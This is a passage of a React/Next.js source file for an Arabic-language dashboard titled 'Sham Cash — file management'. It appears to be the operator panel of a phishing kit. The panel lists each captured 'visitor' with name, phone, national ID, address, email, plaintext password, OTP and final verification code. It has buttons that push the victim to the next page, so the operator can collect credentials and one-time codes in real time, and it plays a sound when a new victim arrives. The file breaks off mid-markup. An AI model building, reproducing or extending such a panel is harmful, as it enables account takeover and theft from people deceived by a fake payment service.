'use client';

import { useState, useEffect, useMemo } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useVisitorContext } from '@/contexts/VisitorContext';
import { useNewVisitorSound } from '@/hooks/useNewVisitorSound';
import { useSoundSystem } from '@/hooks/useSound';
import { Visitor, VisitorStep, STEP_LABELS, STEP_COLORS } from '@/lib/types';
import DashboardGuard from '@/components/DashboardGuard';

const STATUS_CFG: Record<string, { label: string; dot: string; badge: string; text: string }> = {
  active:    { label: '\u0646\u0634\u0637',    dot: 'bg-blue-400',   badge: 'bg-blue-500/20 border-blue-500/30',    text: 'text-blue-400' },
  pending:   { label: '\u0627\u0646\u062a\u0638\u0627\u0631', dot: 'bg-yellow-400', badge: 'bg-yellow-500/20 border-yellow-500/30', text: 'text-yellow-400' },
  completed: { label: '\u0645\u0643\u062a\u0645\u0644', dot: 'bg-green-400',  badge: 'bg-green-500/20 border-green-500/30',   text: 'text-green-400' },
  rejected:  { label: '\u0645\u0631\u0641\u0648\u0636', dot: 'bg-red-400',    badge: 'bg-red-500/20 border-red-500/30',       text: 'text-red-400' },
};

const TRANSFER_TARGETS: { step: VisitorStep; label: string; desc: string; icon: string; ring: string }[] = [
  { step: 1,                label: '\u0627\u0644\u0645\u0639\u0644\u0648\u0645\u0627\u062a \u0627\u0644\u0634\u062e\u0635\u064a\u0629',      desc: '\u0627\u0644\u0627\u0633\u0645\u060c \u0627\u0644\u0647\u0627\u062a\u0641\u060c \u0627\u0644\u0647\u0648\u064a\u0629\u060c \u0627\u0644\u0639\u0646\u0648\u0627\u0646', icon: '\u{1f464}', ring: 'hover:border-blue-500/60 hover:bg-blue-500/10 text-blue-300' },
  { step: 2,                label: '\u0627\u0644\u0628\u0631\u064a\u062f \u0648\u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631',      desc: '\u0627\u0644\u0628\u0631\u064a\u062f \u0627\u0644\u0625\u0644\u0643\u062a\u0631\u0648\u0646\u064a \u0648\u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631', icon: '\u{1f4e7}', ring: 'hover:border-purple-500/60 hover:bg-purple-500/10 text-purple-300' },
  { step: 3,                label: '\u0631\u0645\u0632 \u0627\u0644\u0623\u0645\u0627\u0646 (OTP)',        desc: '\u0625\u062f\u062e\u0627\u0644 \u0631\u0645\u0632 \u0627\u0644\u062a\u062d\u0642\u0642',               icon: '\u{1f510}', ring: 'hover:border-yellow-500/60 hover:bg-yellow-500/10 text-yellow-300' },
  { step: 4,                label: '\u0627\u0644\u062a\u062d\u0642\u0642 \u0627\u0644\u0646\u0647\u0627\u0626\u064a',          desc: '\u0631\u0645\u0632 \u0627\u0644\u062a\u062d\u0642\u0642 \u0627\u0644\u0623\u062e\u064a\u0631',              icon: '\u2705', ring: 'hover:border-green-500/60 hover:bg-green-500/10 text-green-300' },
  { step: 'password-reset', label: '\u0625\u0639\u0627\u062f\u0629 \u062a\u0639\u064a\u064a\u0646 \u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631', desc: '\u062a\u063a\u064a\u064a\u0631 \u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631',               icon: '\u{1f511}', ring: 'hover:border-orange-500/60 hover:bg-orange-500/10 text-orange-300' },
];

const FILTER_TABS = [
  { value: 'all',       label: '\u0627\u0644\u0643\u0644' },
  { value: 'active',    label: '\u0646\u0634\u0637' },
  { value: 'pending',   label: '\u0627\u0646\u062a\u0638\u0627\u0631' },
  { value: 'completed', label: '\u0645\u0643\u062a\u0645\u0644' },
  { value: 'rejected',  label: '\u0645\u0631\u0641\u0648\u0636' },
];
const TOTAL_STEPS = 4;

function fmtDate(iso: string) {
  return new Date(iso).toLocaleString('ar-SA', { dateStyle: 'short', timeStyle: 'short' });
}
function formatCaseNumber(index: number) {
  return '#' + String(index + 1).padStart(4, '0');
}

function CaseRow({ visitor, realIndex, isSelected, onClick }: { visitor: Visitor; realIndex: number; isSelected: boolean; onClick: () => void }) {
  const st = STATUS_CFG[visitor.status] ?? STATUS_CFG.active;
  const stepNum = typeof visitor.currentStep === 'number' ? visitor.currentStep : null;
  const stepColor = STEP_COLORS[String(visitor.currentStep)] ?? 'bg-gray-500';
  const stepLabel = STEP_LABELS[String(visitor.currentStep)] ?? String(visitor.currentStep);
  return (
    <button onClick={onClick} className={['w-full text-right px-4 py-3.5 border-b border-[#2d3a4f] transition-all duration-150 flex items-start gap-3', isSelected ? 'bg-[#4A7FFF]/10 border-l-2 border-l-[#4A7FFF]' : 'hover:bg-[#2d3a4f]/40'].join(' ')}>
      <div className="pt-1.5 shrink-0"><div className={`w-2 h-2 rounded-full ${st.dot}`} /></div>
      <div className="flex-1 min-w-0">
        <div className="flex items-center gap-2 mb-1">
          <span className="text-[#4a5568] text-[10px] font-mono shrink-0">{formatCaseNumber(realIndex)}</span>
          <span className="text-white font-semibold text-sm truncate">{visitor.name}</span>
        </div>
        <div className="flex items-center gap-1.5 flex-wrap">
          <span className="text-[#6b7a8f] text-xs">{visitor.phone}</span>
          {stepNum !== null
            ? <span className={`text-[10px] px-1.5 py-0.5 rounded text-white font-medium ${stepColor}`}>{'\u062e'}{stepNum}</span>
            : <span className={`text-[10px] px-1.5 py-0.5 rounded text-white font-medium ${stepColor}`}>{stepLabel}</span>}
          <span className={`text-[10px] px-1.5 py-0.5 rounded-full border font-medium ${st.badge} ${st.text}`}>{st.label}</span>
        </div>
        <p className="text-[#3a4a5f] text-[10px] mt-1 font-mono">{fmtDate(visitor.createdAt)}</p>
      </div>
    </button>
  );
}

function DataField({ label, value, mono = false, masked = false }: { label: string; value?: string; mono?: boolean; masked?: boolean }) {
  const [reveal, setReveal] = useState(false);
  if (!value) return null;
  return (
    <div className="bg-[#1e2d3d] rounded-xl p-3.5 border border-[#2d3a4f]">
      <p className="text-[#4a5568] text-[10px] font-semibold uppercase tracking-wider mb-1.5">{label}</p>
      <div className="flex items-center gap-2">
        <p className={`text-white text-sm flex-1 break-all ${mono ? 'font-mono' : 'font-medium'}`}>{masked && !reveal ? '\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022' : value}</p>
        {masked && (
          <button type="button" onClick={() => setReveal(r => !r)} className="text-[#4a5568] hover:text-[#a0aec0] transition-colors shrink-0">
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              {reveal
                ? <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                : <><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></>
              }
            </svg>
          </button>
        )}
      </div>
    </div>
  );
}

function SectionHeading({ icon, children }: { icon: string; children: React.ReactNode }) {
  const paths: Record<string, React.ReactNode> = {
    user: <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />,
    chart: <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" />,
    transfer: <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4" />,
    controls: <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4" />,
  };
  return (
    <h3 className="text-[#4a5568] text-[10px] font-bold uppercase tracking-widest mb-3 flex items-center gap-2">
      <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">{paths[icon]}</svg>
      {children}
    </h3>
  );
}

function ActionBtn({ label, color, icon, onClick }: { label: string; color: 'green' | 'yellow' | 'red' | 'ghost'; icon: string; onClick: () => void }) {
  const colorMap: Record<string, string> = {
    green: 'bg-green-500/15 hover:bg-green-500/25 text-green-400 border border-green-500/30 hover:border-green-500/50',
    yellow: 'bg-yellow-500/15 hover:bg-yellow-500/25 text-yellow-400 border border-yellow-500/30 hover:border-yellow-500/50',
    red: 'bg-red-500/15 hover:bg-red-500/25 text-red-400 border border-red-500/30 hover:border-red-500/50',
    ghost: 'bg-[#1e2d3d] hover:bg-red-500/15 text-[#a0aec0] hover:text-red-400 border border-[#2d3a4f] hover:border-red-500/30',
  };
  const iconPaths: Record<string, React.ReactNode> = {
    check: <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />,
    clock: <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />,
    x: <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />,
    trash: <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />,
  };
  return (
    <button type="button" onClick={onClick} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-semibold text-sm transition-all ${colorMap[color]}`}>
      <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">{iconPaths[icon]}</svg>
      {label}
    </button>
  );
}

function VisitorFilePanel({ visitor, realIndex, onTransfer, onApprove, onReject, onPending, onRemove }: {
  visitor: Visitor; realIndex: number;
  onTransfer: (id: string, step: VisitorStep) => void;
  onApprove: (id: string) => void; onReject: (id: string) => void;
  onPending: (id: string) => void; onRemove: (id: string) => void;
}) {
  const st = STATUS_CFG[visitor.status] ?? STATUS_CFG.active;
  const rd = visitor.registrationData;
  const stepColor = STEP_COLORS[String(visitor.currentStep)] ?? 'bg-gray-500';
  const stepNum = typeof visitor.currentStep === 'number' ? visitor.currentStep : null;
  const stepLabel = STEP_LABELS[String(visitor.currentStep)] ?? String(visitor.currentStep);
  const isNumericStep = stepNum !== null;
  const isCompleted = visitor.status === 'completed';
  const isRejected = visitor.status === 'rejected';
  const isClosed = isCompleted || isRejected;

  return (
    <div className="h-full flex flex-col overflow-hidden">
      {/* File Header */}
      <div className="bg-[#1e2d3d] border-b border-[#2d3a4f] px-6 py-5 shrink-0">
        <div className="flex items-start gap-4">
          <div className={`w-14 h-14 rounded-2xl flex items-center justify-center text-white font-bold text-2xl shrink-0 ${stepColor}`}>{visitor.name.charAt(0)}</div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-3 flex-wrap">
              <h2 className="text-white font-bold text-xl leading-tight">{visitor.name}</h2>
              <span className="text-[#4a5568] text-sm font-mono">{formatCaseNumber(realIndex)}</span>
              <span className={`px-2.5 py-0.5 rounded-full text-xs font-bold border ${st.badge} ${st.text}`}>{st.label}</span>
            </div>
            <p className="text-[#a0aec0] text-sm mt-0.5 font-mono">{visitor.phone}</p>
            <div className="flex items-center gap-1.5 mt-1">
              <svg className="w-3 h-3 text-[#4a5568]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
              <p className="text-[#4a5568] text-xs">{'\u062f\u062e\u0644 \u0641\u064a'} {fmtDate(visitor.createdAt)}</p>
            </div>
          </div>
          <div className="shrink-0 pt-1">
            <p className="text-[#4a5568] text-[10px] mb-1.5 text-center">{isNumericStep ? `${stepNum} / ${TOTAL_STEPS}` : stepLabel}</p>
            {isNumericStep ? (
              <div className="flex gap-1">
                {Array.from({ length: TOTAL_STEPS }, (_, i) => i + 1).map(s => (<div key={s} className={`w-8 h-2 rounded-full transition-all duration-300 ${s <= (stepNum ?? 0) ? stepColor : 'bg-[#2d3a4f]'}`} />))}
              </div>
            ) : (
              <div className={`text-[10px] px-2 py-1 rounded-full text-white font-medium text-center ${stepColor}`}>{stepLabel}</div>
            )}
          </div>
        </div>
      </div>

      {/* Scrollable body */}
      <div className="flex-1 overflow-y-auto">
        <div className="px-6 py-5 space-y-6">

          <section>
            <SectionHeading icon="user">{'\u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0644\u0632\u0627\u0626\u0631'}</SectionHeading>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
              <DataField label={'\u0627\u0644\u0627\u0633\u0645 \u0627\u0644\u0643\u0627\u0645\u0644'}         value={rd.fullName || visitor.name} />
              <DataField label={'\u0631\u0642\u0645 \u0627\u0644\u0647\u0627\u062a\u0641'}           value={visitor.phone}                mono />
              <DataField label={'\u0631\u0642\u0645 \u0627\u0644\u0647\u0648\u064a\u0629 \u0627\u0644\u0648\u0637\u0646\u064a\u0629'}  value={rd.idNumber}                  mono />
              <DataField label={'\u0627\u0644\u0639\u0646\u0648\u0627\u0646'}               value={rd.address} />
              <DataField label={'\u0627\u0644\u0628\u0631\u064a\u062f \u0627\u0644\u0625\u0644\u0643\u062a\u0631\u0648\u0646\u064a'}   value={rd.email || visitor.email} />
              <DataField label={'\u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631'}         value={rd.password}                  masked />
              <DataField label={'\u0631\u0645\u0632 \u0627\u0644\u0623\u0645\u0627\u0646 (OTP)'}     value={rd.securityCode}              mono masked />
              <DataField label={'\u0631\u0645\u0632 \u0627\u0644\u062a\u062d\u0642\u0642 \u0627\u0644\u0646\u0647\u0627\u0626\u064a'}   value={rd.verificationCode}          mono masked />
            </div>
          </section>

          <section>
            <SectionHeading icon="chart">{'\u0627\u0644\u062d\u0627\u0644\u0629 \u0648\u0627\u0644\u0645\u0648\u0642\u0639 \u0627\u0644\u062d\u0627\u0644\u064a'}</SectionHeading>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
              <div className="bg-[#1e2d3d] rounded-xl p-3.5 border border-[#2d3a4f]">
                <p className="text-[#4a5568] text-[10px] font-semibold uppercase tracking-wider mb-1.5">{'\u0627\u0644\u062e\u0637\u0648\u0629 \u0627\u0644\u062d\u0627\u0644\u064a\u0629'}</p>
                <div className="flex items-center gap-2">
                  <span className={`w-2 h-2 rounded-full shrink-0 ${stepColor}`} />
                  <p className="text-white font-medium text-sm">{typeof visitor.currentStep === 'number' ? `${'\u0627\u0644\u062e\u0637\u0648\u0629'} ${visitor.currentStep} \u2014 ${STEP_LABELS[String(visitor.currentStep)]}` : STEP_LABELS[String(visitor.currentStep)] ?? String(visitor.currentStep)}</p>
                </div>
              </div>
              <div className="bg-[#1e2d3d] rounded-xl p-3.5 border border-[#2d3a4f]">
                <p className="text-[#4a5568] text-[10px] font-semibold uppercase tracking-wider mb-1.5">{'\u062d\u0627\u0644\u0629 \u0627\u0644\u0645\u0644\u0641'}</p>
                <div className="flex items-center gap-2">
                  <div className={`w-2.5 h-2.5 rounded-full ${st.dot}`} />
                  <p className={`font-bold text-sm ${st.text}`}>{st.label}</p>
                </div>
              </div>
              <div className="bg-[#1e2d3d] rounded-xl p-3.5 border border-[#2d3a4f]">
                <p className="text-[#4a5568] text-[10px] font-semibold uppercase tracking-wider mb-1.5">{'\u0648\u0642\u062a \u0627\u0644\u062f\u062e\u0648\u0644'}</p>
                <p className="text-white font-medium text-sm font-mono">{fmtDate(visitor.createdAt)}</p>
              </div>
              <div className="bg-[#1e2d3d] rounded-xl p-3.5 border border-[#2d3a4f]">
                <p className="text-[#4a5568] text-[10px] font-semibold uppercase tracking-wider mb-1.5">{'\u0631\u0642\u0645 \u0627\u0644\u0645\u0644\u0641'}</p>
                <p className="text-white font-mono text-lg font-bold">{formatCaseNumber(realIndex)}</p>
              </div>
            </div>
          </section>

          {!isClosed && (
            <section>
              <SectionHeading icon="transfer">{'\u062a\u062d\u0648\u064a\u0644 \u0627\u0644\u0632\u0627\u0626\u0631 \u0625\u0644\u0649 \u0635\u0641\u062d\u0629'}</SectionHeading>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                {TRANSFER_TARGETS.map(({ step, label, desc, icon, ring }) => {
                  const isCurrent = visitor.currentStep === step;
                  return (
                    <button key={String(step)} type="button" onClick={() => !isCurrent && onTransfer(visitor.id, step)} disabled={isCurrent}
                      className={['flex items-start gap-3 p-3.5 rounded-xl border text-right transition-all duration-150', isCurrent ? 'border-[#4A7FFF]/40 bg-[#4A7FFF]/10 cursor-default' : `border-[#2d3a4f] bg-[#1a2332] cursor-pointer ${ring}`].join(' ')}>
                      <span className="text-xl mt-0.5 shrink-0">{icon}</span>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className="font-semibold text-sm">{label}</span>
                          {isCurrent && (<span className="text-[10px] bg-[#4A7FFF]/20 text-[#4A7FFF] px-2 py-0.5 rounded-full font-semibold">{'\u0627\u0644\u062d\u0627\u0644\u064a\u0629'}</span>)}
                        </div>
                        <p className="text-[#4a5568] text-xs mt-0.5">{desc}</p>
                      </div>
                    </button>
                  );
                })}
              </div>
            </section>
          )}

          <section>
            <SectionHeading icon="controls">{'\u0627\u0644\u0625\u062c\u0631\u0627\u0621\u0627\u062a'}</SectionHeading>
            <div className="flex flex-wrap gap-2">
              {visitor.status === 'active' && (<>
                <ActionBtn label={'\u0642\u0628\u0648\u0644 \u0648\u0625\u062a\u0645\u0627\u0645'} color="green"  icon="check" onClick={() => onApprove(visitor.id)} />
                <ActionBtn label={'\u0625\u0631\u0633\u0627\u0644 \u0644\u0644\u0627\u0646\u062a\u0638\u0627\u0631'} color="yellow" icon="clock" onClick={() => onPending(visitor.id)} />
                <ActionBtn label={'\u0631\u0641\u0636'}          color="red"   icon="x"     onClick={() => onReject(visitor.id)} />
              </>)}
              {visitor.status === 'pending' && (<>
                <ActionBtn label={'\u0642\u0628\u0648\u0644 \u0645\u0646 \u0627\u0644\u0627\u0646\u062a\u0638\u0627\u0631'} color="green" icon="check" onClick={() => onApprove(visitor.id)} />
                <ActionBtn label={'\u0631\u0641\u0636'}         color="red"   icon="x"     onClick={() => onReject(visitor.id)} />
              </>)}
              <ActionBtn label={'\u062d\u0630\u0641 \u0627\u0644\u0645\u0644\u0641'} color="ghost" icon="trash" onClick={() => onRemove(visitor.id)} />
            </div>
          </section>

          {isCompleted && (
            <div className="bg-green-500/10 border border-green-500/30 rounded-2xl p-5 text-center">
              <p className="text-green-400 text-3xl mb-2">{'\u2705'}</p>
              <p className="text-green-400 font-bold text-base">{'\u062a\u0645 \u0625\u062a\u0645\u0627\u0645 \u0627\u0644\u062a\u0633\u062c\u064a\u0644 \u0628\u0646\u062c\u0627\u062d'}</p>
              <p className="text-green-400/60 text-sm mt-1">{'\u0647\u0630\u0627 \u0627\u0644\u0645\u0644\u0641 \u0645\u0643\u062a\u0645\u0644 \u2014 \u0644\u0627 \u064a\u062d\u062a\u0627\u062c \u0625\u0644\u0649 \u0625\u062c\u0631\u0627\u0621 \u0625\u0636\u0627\u0641\u064a'}</p>
            </div>
          )}
          {isRejected && (
            <div className="bg-red-500/10 border border-red-500/30 rounded-2xl p-5 text-center">
              <p className="text-red-400 text-3xl mb-2">{'\u274c'}</p>
              <p className="text-red-400 font-bold text-base">{'\u062a\u0645 \u0631\u0641\u0636 \u0647\u0630\u0627 \u0627\u0644\u0632\u0627\u0626\u0631'}</p>
              <p className="text-red-400/60 text-sm mt-1">{'\u064a\u0645\u0643\u0646 \u0645\u0631\u0627\u062c\u0639\u0629 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \u0623\u0648 \u062d\u0630\u0641 \u0627\u0644\u0645\u0644\u0641'}</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function NoFileSelected() {
  return (
    <div className="h-full flex flex-col items-center justify-center gap-4 text-center p-10">
      <div className="w-20 h-20 bg-[#1e2d3d] rounded-2xl flex items-center justify-center border border-[#2d3a4f]">
        <svg className="w-10 h-10 text-[#2d3a4f]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
        </svg>
      </div>
      <div>
        <p className="text-[#a0aec0] text-lg font-semibold">{'\u0627\u062e\u062a\u0631 \u0645\u0644\u0641 \u0632\u0627\u0626\u0631'}</p>
        <p className="text-[#4a5568] text-sm mt-1 max-w-xs">{'\u0627\u0636\u063a\u0637 \u0639\u0644\u0649 \u0623\u064a \u0645\u0644\u0641 \u0645\u0646 \u0627\u0644\u0642\u0627\u0626\u0645\u0629 \u0644\u0639\u0631\u0636 \u062a\u0641\u0627\u0635\u064a\u0644\u0647 \u0627\u0644\u0643\u0627\u0645\u0644\u0629 \u0648\u0627\u0644\u062a\u062d\u0643\u0645 \u0641\u064a\u0647'}</p>
      </div>
    </div>
  );
}

function DashboardContent() {
  const router = useRouter();
  const { visitors, transferVisitor, completeVisitor, rejectVisitor, setVisitorPending, removeVisitor } = useVisitorContext();
  useNewVisitorSound(visitors.length);
  const { play } = useSoundSystem();

  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [filterStatus, setFilterStatus] = useState('all');
  const [searchQuery, setSearchQuery] = useState('');

  const normalizedSearch = searchQuery.trim().toLowerCase();
  const idToIndexMap = useMemo(
    () => new Map(visitors.map((v, i) => [v.id, i])),
    [visitors]
  );
  const statusFilteredVisitors = useMemo(
    () => (filterStatus === 'all' ? visitors : visitors.filter(v => v.status === filterStatus)),
    [visitors, filterStatus]
  );
  const filteredVisitors = useMemo(
    () => normalizedSearch
      ? statusFilteredVisitors.filter(v => {
          const ri = idToIndexMap.get(v.id) ?? -1;
          const searchable = [v.name, v.phone, v.email, v.registrationData.email, ri >= 0 ? formatCaseNumber(ri) : '']
            .filter(Boolean)
            .join(' ')
            .toLowerCase();
          return searchable.includes(normalizedSearch);
        })
      : statusFilteredVisitors,
    [statusFilteredVisitors, normalizedSearch, idToIndexMap]
  );
  const selectedVisitor = visitors.find(v => v.id === selectedId) ?? null;
  const firstFilteredId = filteredVisitors[0]?.id ?? null;
  const hasSelectedInFiltered = selectedId ? filteredVisitors.some(v => v.id === selectedId) : false;

  useEffect(() => {
    if (!firstFilteredId) {
      if (selectedId !== null) setSelectedId(null);
      return;
    }
    if (!selectedId || !hasSelectedInFiltered) setSelectedId(firstFilteredId);
  }, [firstFilteredId, hasSelectedInFiltered, selectedId]);

  const handleLogout = () => { sessionStorage.removeItem('dashboard_auth'); router.push('/login'); };
  const handleRemove = async (id: string) => { await removeVisitor(id); play('rejection'); if (selectedId === id) setSelectedId(null); };
  const realIndex = selectedVisitor ? (idToIndexMap.get(selectedVisitor.id) ?? -1) : -1;

  const activeCount    = visitors.filter(v => v.status === 'active').length;
  const pendingCount   = visitors.filter(v => v.status === 'pending').length;
  const completedCount = visitors.filter(v => v.status === 'completed').length;
  const rejectedCount  = visitors.filter(v => v.status === 'rejected').length;

  return (
    <div className="h-screen flex flex-col bg-[#1a2332] overflow-hidden" dir="rtl">
      <nav className="bg-[#1e2d3d] border-b border-[#2d3a4f] px-5 py-3 shrink-0">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-2.5">
              <div className="w-8 h-8 bg-[#4A7FFF] rounded-lg flex items-center justify-center shrink-0">
                <svg className="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" /></svg>
              </div>
              <div>
                <h1 className="text-white font-bold text-sm leading-none">{'\u0634\u0627\u0645 \u0643\u0627\u0634 \u2014 \u0625\u062f\u0627\u0631\u0629 \u0627\u0644\u0645\u0644\u0641\u0627\u062a'}</h1>
                <p className="text-[#4a5568] text-[10px] mt-0.5">{'\u0646\u0638\u0627\u0645 \u0645\u062a\u0627\u0628\u0639\u0629 \u0627\u0644\u0632\u0648\u0627\u0631'}</p>
              </div>
            </div>
            <div className="hidden md:flex items-center gap-2">
              <span className="bg-[#2d3a4f] px-2.5 py-1 rounded-lg text-[#a0aec0] text-xs">{visitors.length} {'\u0645\u0644\u0641'}</span>
              {activeCount > 0 && (<span className="bg-blue-500/15 border border-blue-500/30 px-2.5 py-1 rounded-lg text-blue-400 text-xs">{activeCount} {'\u0646\u0634\u0637'}</span>)}
              {pendingCount > 0 && (<span className="bg-yellow-500/15 border border-yellow-500/30 px-2.5 py-1 rounded-lg text-yellow-400 text-xs">{pendingCount} {'\u0627\u0646\u062a\u0638\u0627\u0631'}</span>)}
              {completedCount > 0 && (<span className="bg-green-500/15 border border-green-500/30 px-2.5 py-1 rounded-lg text-green-400 text-xs">{completedCount} {'\u0645\u0643\u062a\u0645\u0644'}</span>)}
              {rejectedCount > 0 && (<span className="bg-red-500/15 border border-red-500/30 px-2.5 py-1 rounded-lg text-red-400 text-xs">{rejectedCount} {'\u0645\u0631\u0641\u0648\u0636'}</span>)}
            </div>
          </div>
          <div className="flex items-center gap-1">
            <Link href="/" className="flex items-center gap-1.5 text-[#a0aec0] hover:text-white text-sm px-3 py-1.5 rounded-lg hover:bg-[#2d3a4f] transition-colors">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" /></svg>
              {'\u0627\u0644\u0645\u0648\u0642\u0639'}
            </Link>
            <button type="button" onClick={handleLogout} className="flex items-center gap-1.5 text-red-400 hover:text-red-300 text-sm px-3 py-1.5 rounded-lg hover:bg-red-500/10 transition-colors">
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" /></svg>
              {'\u062e\u0631\u0648\u062c'}
            </button>
          </div>
        </div>
      </nav>

      <div className="flex flex-1 overflow-hidden">
        {/* Right sidebar: case list */}
        <div className="w-72 md:w-80 bg-[#161f2e] border-l border-[#2d3a4f] flex flex-col overflow-hidden shrink-0">
          <div className="px-3 py-3 border-b border-[#2d3a4f] bg-[#1a2332] shrink-0">
            <div className="flex items-center justify-between mb-2.5">
              <h2 className="text-white font-semibold text-sm">{'\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0645\u0644\u0641\u0627\u062a'}</h2>
              <span className="text-[#4a5568] text-xs bg-[#2d3a4f] px-2 py-0.5 rounded-full">{filteredVisitors.length}</span>
            </div>
            <div className="flex gap-1 flex-wrap">
              {FILTER_TABS.map(tab => {
                const count = tab.value === 'all' ? visitors.length : visitors.filter(v => v.status === tab.value).length;
                return (
                  <button key={tab.value} type="button" onClick={() => { setFilterStatus(tab.value); setSelectedId(null); }}
                    className={`px-2.5 py-1 rounded-lg text-xs font-medium transition-all ${filterStatus === tab.value ? 'bg-[#4A7FFF] text-white' : 'text-[#6b7a8f] hover:text-white hover:bg-[#2d3a4f]'}`}>
                    {tab.label}
                    {count > 0 && (<span className={`mr-1 ${filterStatus === tab.value ? 'text-white/70' : 'text-[#4a5568]'}`}>{count}</span>)}
                  </button>
                );
              })}
            </div>
            <div className="mt-2.5">
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => { setSearchQuery(e.target.value); setSelectedId(null); }}
                placeholder="\u0628\u062d\u062b \u0628\u0627\u0644\u0627\u0633\u0645 \u0623\u0648 \u0627\u0644\u0647\u0627\u062a\u0641 \u0623\u0648 \u0631\u0642\u0645 \u0627\u0644\u0645\u0644\u0641"
                className="w-full bg-[#131c2b] border border-[#2d3a4f] rounded-lg px-3 py-2 text-sm text-white placeholder:text-[#4a5568] focus:outline-none focus:border-[#4A7FFF]"
              />
            </div>
          </div>
          <div className="flex-1 overflow-y-auto">
            {filteredVisitors.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-full gap-3 p-6 text-center">
                <div className="w-12 h-12 bg-[#1e2d3d] rounded-xl flex items-center justify-center border border-[#2d3a4f]">
